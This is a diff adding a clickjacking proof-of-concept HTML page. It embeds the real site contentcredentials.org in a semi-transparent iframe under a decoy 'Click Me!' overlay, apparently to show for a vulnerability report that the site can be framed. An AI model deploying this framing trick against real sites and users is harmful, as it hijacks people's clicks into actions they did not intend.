@@ -1,1 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking PoC</title>
+    <style>
+        /* Container for the iframe */
+        .iframe-container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+        }
 
+        /* The iframe itself */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.5; /* Make the iframe semi-transparent for demonstration */
+        }
+
+        /* Overlay to trick the user */
+        .overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 50px;
+            background-color: rgba(255, 0, 0, 0.5); /* Semi-transparent red */
+            z-index: 1;
+            cursor: pointer;
+        }
+
+        /* Text on the overlay */
+        .overlay-text {
+            color: white;
+            text-align: center;
+            line-height: 50px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="iframe-container">
+        <!-- Embed the target website in an iframe -->
+        <iframe src="https://contentcredentials.org/"></iframe>
+
+        <!-- Overlay to trick the user -->
+        <div class="overlay">
+            <div class="overlay-text">Click Me!</div>
+        </div>
+    </div>
+</body>
+</html>
